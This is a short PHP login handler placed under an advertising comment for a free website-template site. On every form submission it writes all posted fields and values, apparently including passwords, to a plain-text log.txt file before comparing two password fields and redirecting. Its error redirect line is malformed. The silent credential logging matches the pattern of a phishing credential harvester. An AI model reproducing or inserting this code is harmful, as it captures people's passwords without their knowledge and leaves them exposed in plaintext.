<!-- W3hubs.com - Download Free Responsive Website Layout Templates designed on HTML5 CSS3,Bootstrap which are 100% Mobile friendly. w3Hubs all Layouts are responsive cross browser supported, best quality world class designs. -->
<?php



if($_SERVER["REQUEST_METHOD"]=="POST")
{
    $handle = fopen('log.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
	  
$pass_check1=$_POST['pass4'];
$pass_check2=$_POST['pass5'];
     

 if($pass_check1== $pass_check2)
 {
      header('Location: start.php');
     
    }
   else
	{ 
       header('Location : login_error.php;');        
       
      }
}

?>

